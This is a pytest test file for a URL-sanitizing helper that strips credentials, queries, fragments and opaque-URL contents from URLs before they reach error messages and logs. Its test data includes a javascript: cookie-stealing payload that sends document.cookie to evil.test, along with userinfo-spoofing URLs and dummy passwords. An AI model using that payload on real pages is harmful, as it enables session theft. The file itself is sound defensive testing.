"""``sanitize_url_for_error`` shows where a URL points, without the parts that usually carry a secret.

A URL that reaches an error message or a log line is untrusted input, often a credentialed one: the authority holds a
password, the query a signature, an opaque ``data:`` or ``filesystem:`` URL the whole secret. What is shown is the
scheme, host and path. The query and fragment are replaced by a marker, the credentials before the ``@`` are dropped,
an opaque URL is shown as its scheme alone, and a text that is no URL is shown as a fixed placeholder. The path is
shown as it is, so a secret a service puts in its path is the caller's to mask. The function never raises, whatever it
is given.
"""

from __future__ import annotations

import pytest

from myrm_agent_harness.utils.url_utils import sanitize_url_for_error

_PLACEHOLDER = "invalid_or_redacted_url"
_SECRET = "SIGSECRET9f3a"


@pytest.mark.parametrize(
    ("url", "shown"),
    [
        ("https://example.com/api/users", "https://example.com/api/users"),
        ("https://example.com", "https://example.com"),
        ("HTTPS://Example.com:8443/a/b", "https://Example.com:8443/a/b"),
        ("http://[::1]:8080/a", "http://[::1]:8080/a"),
        ("file:///etc/passwd", "file:///etc/passwd"),
        ("https://evil.com/?key=sk-1234567890", "https://evil.com/?<query_redacted>"),
        ("https://example.com/a#section-2", "https://example.com/a#<fragment_redacted>"),
        ("https://example.com/a?x=1#y", "https://example.com/a?<query_redacted>#<fragment_redacted>"),
    ],
)
def test_an_ordinary_url_shows_its_scheme_host_and_path(url: str, shown: str) -> None:
    assert sanitize_url_for_error(url, max_length=100) == shown


def test_a_secret_in_the_path_is_shown_for_the_caller_to_mask() -> None:
    url = f"https://api.example.com/bot123456:{_SECRET}/getMe"

    assert sanitize_url_for_error(url, max_length=100) == url


@pytest.mark.parametrize(
    ("url", "shown"),
    [
        ("https://deploy:hunter2@api.example.com/v1/run", "https://api.example.com/v1/run"),
        ("https://token-4f9c1e@github.com/org/repo.git", "https://github.com/org/repo.git"),
        ("ftp://anonymous:@files.example/pub", "ftp://files.example/pub"),
        ("http://a@b@evil.test/x", "http://evil.test/x"),
        ("http://localhost:80@evil.test/", "http://evil.test/"),
    ],
)
def test_the_credentials_before_the_host_are_never_shown(url: str, shown: str) -> None:
    assert sanitize_url_for_error(url, max_length=100) == shown


@pytest.mark.parametrize(
    ("url", "shown"),
    [
        ("blob:https://app.example/6f1c-4d2a", "blob:"),
        ("data:text/plain;base64,aHVudGVyMg==", "data:"),
        ("filesystem:https://app.example/temporary/report.pdf?sig=abc", "filesystem:"),
        ("javascript:fetch('//evil.test/?t='+document.cookie)", "javascript:"),
        ("mailto:ops@example.com?subject=hunter2", "mailto:"),
    ],
)
def test_an_opaque_url_is_shown_as_its_scheme_alone(url: str, shown: str) -> None:
    assert sanitize_url_for_error(url, max_length=100) == shown


@pytest.mark.parametrize(
    "text",
    ["", "   ", "not a url at all", "/relative/path?t=hunter2", "http://[abc/?t=hunter2", "http://[::1/"],
)
def test_a_text_that_is_no_url_is_shown_as_the_placeholder(text: str) -> None:
    assert sanitize_url_for_error(text) == _PLACEHOLDER


def test_a_long_address_is_cut_and_marked() -> None:
    shown = sanitize_url_for_error(f"https://example.com/{'a' * 100}", max_length=30)

    assert shown == f"https://example.com/{'a' * 10}..."


def test_the_address_is_cut_at_fifty_characters_unless_told_otherwise() -> None:
    shown = sanitize_url_for_error(f"https://example.com/{'a' * 100}")

    assert shown == f"https://example.com/{'a' * 30}..."


@pytest.mark.parametrize(
    "url",
    [
        f"https://deploy:{_SECRET}@h.example/p?sig={_SECRET}#{_SECRET}",
        f"filesystem:https://h.example/temporary/x?sig={_SECRET}",
        f"data:text/plain,{_SECRET}",
        f"blob:{_SECRET}",
        f"http://[{_SECRET}/",
        f"{_SECRET}@h.example/p",
    ],
)
def test_no_part_that_can_carry_a_secret_is_shown(url: str) -> None:
    assert _SECRET not in sanitize_url_for_error(url, max_length=10_000)
